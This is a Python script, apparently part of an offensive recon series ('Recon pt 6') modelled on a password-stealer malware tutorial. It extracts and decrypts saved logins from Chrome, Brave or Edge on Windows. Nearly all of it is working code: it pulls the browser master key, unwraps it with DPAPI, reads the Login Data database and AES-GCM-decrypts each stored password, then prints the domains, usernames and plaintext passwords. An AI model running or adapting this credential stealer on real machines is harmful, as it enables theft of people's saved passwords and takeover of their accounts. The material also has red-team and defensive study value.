## Recon pt 6 
# Chrome passwords enumeration
# Reference in C++ https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571
import os
import sys
import argparse
import sqlite3
import win32crypt
import json
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

CURRENT_USER = os.getlogin()
def get_master_key(browser_dir) -> bytes:
    '''Locate and extract the encryption key from the browser state file'''
    state_file = f"C:\\Users\\{CURRENT_USER}\\AppData\\Local\\{browser_dir}\\User Data\\Local State"

    with open(state_file, 'r', encoding='utf-8') as f:
        data = json.load(f)
        return data.get("os_crypt", {}).get("encrypted_key")

def unprotect_master_key(master_key:bytes)->tuple:
    '''Decrypt the master key.
    Returns: (browser name, decrypted key)'''
    binary_key = base64.b64decode(master_key) #"RFBBUEk -> DPAPI"

    in_data = binary_key[5:]  # Remove DPAPI prefix

    # call CryptUnprotectData to decrypt master key
    output=win32crypt.CryptUnprotectData(in_data, None, None, None, 0)
    if not (output):
        return "Failed to decrypt the private key. \n"
    return output

def aes_decryptor(encrypted_blob:bytes, dmaster_key:bytes)->str:
    '''AES-GCM algorithm decryption with given password blob and decrypted master key.
    Returns: plaintext password'''
    IV_SIZE = 12
    TAG_SIZE = 16

    # Extract initialisation vector, ciphertext, and authtag
    IV = encrypted_blob[3:3 + IV_SIZE]
    ciphertext = encrypted_blob[15:-TAG_SIZE]
    auth_tag = encrypted_blob[-TAG_SIZE:]

    #Initialize AES-GCM cipher
    cipher = Cipher(algorithms.AES(dmaster_key), modes.GCM(IV, tag=auth_tag), backend=default_backend())
    decryptor = cipher.decryptor()

    # Decrypt ciphertext
    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()

    try: # non utf-8 characters
        decrypted_data=decrypted_data.decode('utf-8') 
    except Exception as e:
        return f"ERROR: {e}"
    return decrypted_data

def main():
    parser = argparse.ArgumentParser(description="Enumerate saved passwords from Chrome, Brave, or Edge.")
    parser.add_argument("BROWSER", type=int, choices=[1, 2, 3], nargs='?', help="Choose a browser: 1.Chrome 2.Brave 3.Edge")
    args = parser.parse_args()

    if len(sys.argv) == 1: 
        parser.print_help()
        sys.exit(0)

    browser_dirs = ["Google\\Chrome", "BraveSoftware\\Brave-Browser", "Microsoft\\Edge"]
    BROWSER_DIR = browser_dirs[args.BROWSER - 1]

    try:
        master_key = get_master_key(BROWSER_DIR)
    except FileNotFoundError:
        print(f"Could not locate the state file for the browser. The browser may not be installed on the system.")
        sys.exit(1)

    d_master_key = unprotect_master_key(master_key)[1]
    try:
        con = sqlite3.connect(f"C:\\Users\\{CURRENT_USER}\\AppData\\Local\\{BROWSER_DIR}\\User Data\\Default\\Login Data")
        cursor = con.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    except sqlite3.OperationalError as e:
        print(f"ERROR: {e}") # DB potentially locked
        sys.exit(1)
    
    logins = cursor.fetchall()
    if not logins:
        print("No saved credentials found.")
        sys.exit()

    for login in logins:
        domain, username, password_blob = login
        decrypted_password = aes_decryptor(password_blob,d_master_key)
        if not username:
            username = "None"
            
        if decrypted_password:
            print(f"Domain: {domain}\nUsername: {username}\nPassword: {decrypted_password}")
            print("--------------------------------------------------------------------------")
        else:
            print(f"Failed to decrypt password for domain: {domain}\nUsername: {username}")
            print("--------------------------------------------------------------------------")

if __name__ == "__main__":
    main()
